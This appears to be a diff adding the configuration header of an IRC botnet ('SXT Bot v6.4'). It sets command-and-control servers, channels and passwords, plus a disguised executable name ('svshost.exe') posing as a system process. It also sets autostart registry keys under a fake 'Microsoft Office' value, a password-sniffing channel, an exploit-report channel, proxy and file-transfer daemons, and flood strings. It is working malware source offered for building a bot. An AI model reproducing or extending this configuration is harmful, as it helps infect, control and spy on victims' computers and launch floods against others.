@@ -1,0 +1,60 @@
+// bot configuration (generic) - doesn't need to be encrypted
+int port = 44444;				// server port
+int port2 = 44444;				// backup server port
+int sock4port = 12921;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
+int tftpport = 69;				// Port # for tftp daemon to run on
+int ftpport = 45343;            // Port # for ftpd daemon to run on
+int httpport = 88;				// Port # for http daemon to run on
+BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
+BOOL rndfilename = FALSE;		// use random file name
+BOOL AutoStart = TRUE;			// enable autostart registry keys
+char prefix = ' ';				// command prefix (one character max.)
+int maxrand = 30;				// how many random numbers in the nick
+//char keylogfile[] = "keys.txt";	// keylog filename
+
+#ifdef DEBUG_LOGGING
+char logfile[]="c:\\debug.txt";
+#endif
+
+#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!
+#else										// Recommended to use this only for Crypt() setup, this is unsecure.
+
+char botid[] = "sxtx1";						// bot id
+char version[] = "SXT Bot v6.4";			// Bots !version reply
+char password[] = "0xbadc0ded";				// bot password
+char server[] = "z00m.lassis.org";				// server
+char serverpass[] = "";						// server password
+char channel[] = "#sxt";				// channel that the bot should join
+char chanpass[] = "sxtr0x";					// channel password
+char server2[] = "irc.x86.cl";			// backup server (optional)
+char channel2[] = "#sxt";				// backup channel (optional)
+char psniffchan[] = "#sxt-sniff";				// sniffing channel
+char chanpass2[] = "sxtr0x";					// backup channel password (optional)
+char filename[] = "svshost.exe";			// destination file name
+char exploitchan[] = "#sxt";   // Channel where exploit messages get redirected
+char valuename[] = "Microsoft Office";	// value name for autostart
+char nickconst[] = "";						// first part to the bot's nick
+char szLocalPayloadFile[]="mserv.dat";		// Payload filename
+char modeonconn[] = "+i";					// Can be more than one mode and contain both + and -
+
+char *authost[] = {
+	"*@$$$.fbi.gov"
+};
+
+char *versionlist[] = {
+	"ScReTcH Me BaBy :P",
+};
+
+char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
+char regkey3[]="Software\\Microsoft\\OLE";
+char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";
+
+#endif
+
+#ifdef PLAIN_CRYPT
+char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
+#endif
+
+const char partline[] = "PaWaaPaWaaPaWaaPaWaaPaWaa"; //part floodline
+const char floodline[] = "PaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaa"; // Flood line
